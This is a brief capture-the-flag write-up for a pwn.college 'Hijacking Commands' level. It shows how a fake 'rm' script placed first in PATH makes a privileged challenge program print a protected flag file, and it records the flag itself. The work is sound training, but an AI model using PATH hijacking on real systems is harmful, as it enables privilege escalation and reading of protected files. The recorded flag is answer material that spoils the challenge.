# Pondering PATH

## Hijacking Commands

### Solve
**Flag:** `pwn.college{cWFd57DlKwm0yXt_gHG8kxpkts8.QX3cjM1wSN2gjNzEzW}`

I made a shell script for rm and gave permissions to the user. I then added its path to the current directory. Then on running /challenge/run gives the flag. 

```bash
hacker@path~hijacking-commands:~$ echo "cat /flag" > rm
hacker@path~hijacking-commands:~$ chmod ugo+x rm
hacker@path~hijacking-commands:~$ export PATH="$(pwd):$PATH"
hacker@path~hijacking-commands:~$ /challenge/run 
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{cWFd57DlKwm0yXt_gHG8kxpkts8.QX3cjM1wSN2gjNzEzW}
```

### New Learnings
Adding commands to path list. 

### References 
None
